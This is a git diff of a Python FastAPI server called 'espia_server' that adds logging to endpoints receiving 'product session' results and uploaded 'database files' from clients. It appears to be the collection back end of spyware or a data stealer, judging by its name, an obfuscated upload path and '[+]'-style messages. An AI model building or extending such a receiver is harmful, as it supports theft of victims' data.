@@ -3,7 +3,8 @@ import pathlib
 from fastapi import FastAPI, File, UploadFile, Request
 from starlette.responses import FileResponse
 
-from espia_server.app.utils import handle_products_results, handle_new_uploaded_file, create_new_client_dir, block
+from espia_server.app.utils import handle_products_results, handle_new_uploaded_file, create_new_client_dir, block, \
+    title
 
 # In production we don't want any docs served
 if os.getenv("ESPIA_ENV") == 'prod':
@@ -29,13 +30,16 @@ def upload_results(results: dict) -> dict:
     session_id = results.get('Session-ID')
     create_new_client_dir(session_id)
     handle_products_results(session_id, results)
+    print(block + f"[+] Successfully retrieved product session {session_id}")
     return {}
 
 
 @app.post("/zn1123n/asnndj/bbcsgq")
 async def create_upload_file(request: Request, fileUpload: UploadFile = File(...)) -> dict:
-    file_path = handle_new_uploaded_file(request.headers.get('Session'), fileUpload.filename)
+    session_id = request.headers.get('Session')
+    file_path = handle_new_uploaded_file(session_id, fileUpload.filename)
     with open(file_path, 'wb') as f:
         content = await fileUpload.read()
         f.write(content)
+    print(block + f"[+] Successfully received database files from {session_id}")
     return {}
